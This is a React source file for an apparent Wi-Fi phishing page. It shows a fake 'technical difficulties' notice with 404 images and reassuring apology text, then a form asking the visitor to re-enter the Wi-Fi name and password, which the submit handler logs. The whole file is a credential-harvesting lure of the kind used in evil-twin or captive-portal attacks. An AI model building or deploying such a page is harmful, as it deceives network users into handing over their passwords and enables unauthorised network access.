import './App.css';
import {
    Button,
    FormControl,
    FormLabel,
    Input,
    Text,
    Checkbox,
    Image
} from '@chakra-ui/react'

import React, { useState } from "react";

function App() {
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const handleSubmit = () => {
        console.log(username, password)
    };
    return (
        <div className="Log-In">
            <div className='Header'>
                <Image src="/404-error.png" boxSize='300px'
                    objectFit='cover' alt='404' />
                <div>
                    <Text fontSize="25px" fontWeight="bold">Sorry, your Wi-Fi was experiencing some technical difficulties</Text>
                    <Text fontWeight="100" className='Long-Text'>
                        We apologize for any inconvenience caused by the Wi-Fi disruption.
                        To expedite the resolution process and restore your access to the
                        network, please use the login credentials provided below. Enter
                        your username and password in the designated fields to reconnect
                        to the Wi-Fi network. Once you have successfully logged in, the
                        system will initiate the necessary steps to address the technical
                        difficulties and ensure a stable connection. Thank you for your
                        cooperation, and we appreciate your patience as we work to restore
                        seamless access to the Wi-Fi network.</Text>
                </div>
                <Image src="/404-error-1.png" boxSize='300px'
                    objectFit='cover' alt='404' />
            </div>

            <div className="Log-In-Container">
                <Text fontSize="20px" className='Login-Text' fontWeight="bold">Please Log In Again...</Text>
                <div className='Form'>
                    <FormControl isRequired >
                        <FormLabel>Wi-Fi Name</FormLabel>
                        <Input placeholder='Wi-Fi Name' value={username} onChange={(e) => setUsername(e.target.value)} />
                    </FormControl>
                    <FormControl isRequired>
                        <FormLabel>Wi-Fi Password</FormLabel>
                        <Input type='password' placeholder='Wi-Fi Password' value={password} onChange={(e) => setPassword(e.target.value)} />
                    </FormControl>
                    <Checkbox defaultChecked>Connect automatically</Checkbox>
                    <Button colorScheme='blue' onClick={handleSubmit}>Connect</Button>
                </div>
            </div>
        </div>
    );
}

export default App;
